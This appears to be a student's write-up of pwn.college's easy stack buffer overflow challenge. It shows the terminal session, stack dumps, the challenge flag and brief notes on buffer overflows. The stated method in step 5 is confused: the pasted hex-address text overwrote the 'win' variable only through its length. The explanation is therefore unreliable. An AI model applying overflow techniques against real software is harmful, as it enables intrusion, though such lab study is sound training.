# Binary Exploitation 

## Challenge 1: Your First Overflow (easy)
### Solve 

Overflow a buffer on the stack to set the right conditions to obtain the flag!  

**Flag:** `pwn.college{4zqXXF2gV06aRRpJjGP2fzULUFh.dlDOywyMwAzNzEzW}`
change ownership and read the flag

METHOD:  
1. To find the program file (.c), search in ~ first.  
2. no such file, navigate back to sys files using cd ..  
3. file found in challenge directory.  
4. after executing, it says that a 'win' variable prints the flag when it's non-zero, i.e. You can make this variable be non-zero by overflowing the input buffer  
5. So to overflow, input 0x7fff1ba9a3a0+0x7fff1ba9a3bc,  
which is input buffer start+where win is located  or  input buffer start+end buffer because that would overflow the input buffer too  




```bash
hacker@binary-exploitation~your-first-overflow-easy:/$ /challenge/binary-exploitation-first-overflow-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeb5d55fc0 (rsp+0x0000) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffeb5d55fc8 (rsp+0x0008) | 68 71 d5 b5 fe 7f 00 00 | 0x00007ffeb5d57168 |
| 0x00007ffeb5d55fd0 (rsp+0x0010) | 58 71 d5 b5 fe 7f 00 00 | 0x00007ffeb5d57158 |
| 0x00007ffeb5d55fd8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffeb5d55fe0 (rsp+0x0020) | a0 24 50 be d7 72 00 00 | 0x000072d7be5024a0 |
| 0x00007ffeb5d55fe8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb5d55ff0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb5d55ff8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb5d56000 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb5d56008 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb5d56010 (rsp+0x0050) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffeb5d56018 (rsp+0x0058) | 00 63 a3 11 7d 3e 1a e1 | 0xe11a3e7d11a36300 |
| 0x00007ffeb5d56020 (rsp+0x0060) | 60 70 d5 b5 fe 7f 00 00 | 0x00007ffeb5d57060 |
| 0x00007ffeb5d56028 (rsp+0x0068) | 98 26 40 00 00 00 00 00 | 0x0000000000402698 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffeb5d55fc0, and our base pointer points to 0x7ffeb5d56020.
This means that we have (decimal) 14 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 112 bytes.
The input buffer begins at 0x7ffeb5d55ff0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 26 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffeb5d5600c, 28 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffeb5d55ff0 (the start of the input buffer)
right up to (but not including) 0x7ffeb5d56ff0 (which is 4070 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
0x7fff1ba9a3bc+0x7ffeb5d56ff0
You sent 30 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeb5d55fc0 (rsp+0x0000) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffeb5d55fc8 (rsp+0x0008) | 68 71 d5 b5 fe 7f 00 00 | 0x00007ffeb5d57168 |
| 0x00007ffeb5d55fd0 (rsp+0x0010) | 58 71 d5 b5 fe 7f 00 00 | 0x00007ffeb5d57158 |
| 0x00007ffeb5d55fd8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffeb5d55fe0 (rsp+0x0020) | a0 24 50 be 1e 00 00 00 | 0x0000001ebe5024a0 |
| 0x00007ffeb5d55fe8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffeb5d55ff0 (rsp+0x0030) | 30 78 37 66 66 66 31 62 | 0x6231666666377830 |
| 0x00007ffeb5d55ff8 (rsp+0x0038) | 61 39 61 33 62 63 2b 30 | 0x302b636233613961 |
| 0x00007ffeb5d56000 (rsp+0x0040) | 78 37 66 66 65 62 35 64 | 0x6435626566663778 |
| 0x00007ffeb5d56008 (rsp+0x0048) | 35 36 66 66 30 0a 00 00 | 0x00000a3066663635 |
| 0x00007ffeb5d56010 (rsp+0x0050) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffeb5d56018 (rsp+0x0058) | 00 63 a3 11 7d 3e 1a e1 | 0xe11a3e7d11a36300 |
| 0x00007ffeb5d56020 (rsp+0x0060) | 60 70 d5 b5 fe 7f 00 00 | 0x00007ffeb5d57060 |
| 0x00007ffeb5d56028 (rsp+0x0068) | 98 26 40 00 00 00 00 00 | 0x0000000000402698 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffeb5d55ff0
- the saved frame pointer (of main) is at 0x7ffeb5d56020
- the saved return address (previously to main) is at 0x7ffeb5d56028
- the saved return address is now pointing to 0x402698.
- the canary is stored at 0x7ffeb5d56018.
- the canary value is now 0xe11a3e7d11a36300.
- the address of the win variable is 0x7ffeb5d5600c.
- the value of the win variable is 0xa30.

You win! Here is your flag:
pwn.college{4zqXXF2gV06aRRpJjGP2fzULUFh.dlDOywyMwAzNzEzW}


Goodbye!
```


### New Learnings
1. A buffer overflow occurs when the amount of data exceeds the storage capacity of the memory buffer.  
2. As a result, the program attempting to write the data to the buffer overwrites adjacent memory locations.   
3. Buffer overflow attack- A buffer overflow happens when someone gives a program more data than it can handle,  
messing with memory to make the program do something unintended or run malicious code.  
4. If they know where things are in memory, they can target specific parts to take control.  


### References
Slides  
https://www.imperva.com/learn/application-security/buffer-overflow/  
